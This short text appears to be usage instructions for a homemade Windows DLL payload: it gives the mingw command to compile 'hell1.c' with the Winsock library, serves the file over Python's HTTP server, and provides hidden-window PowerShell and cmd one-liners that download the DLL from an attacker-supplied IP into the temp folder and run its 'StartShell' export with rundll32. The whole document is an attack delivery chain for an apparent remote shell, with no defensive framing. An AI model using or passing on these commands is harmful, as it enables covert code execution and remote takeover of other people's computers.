In youe Linux shell you need to compile the code bu the given command
$x86_64-w64-mingw32-gcc -shared -o finalfilename.dll hell1.c -lws2_32 -municode

Then you can send this fiile by anyways i use a simple way
$python3 -m http.server

Now come to windows
powershell
$powershell -w hidden -c "$f=Join-Path $env:TEMP 'hell.dll';iwr -uri 'http://your-ip:0000/hell.dll' -OutFile $f;rundll32 $f,StartShell"
cmd
$cmd /c powershell -w hidden -c "$f=Join-Path $env:TEMP 'hell.dll';iwr -uri 'http://your-ip:0000/hell.dll' -OutFile $f;rundll32 $f,StartShell"
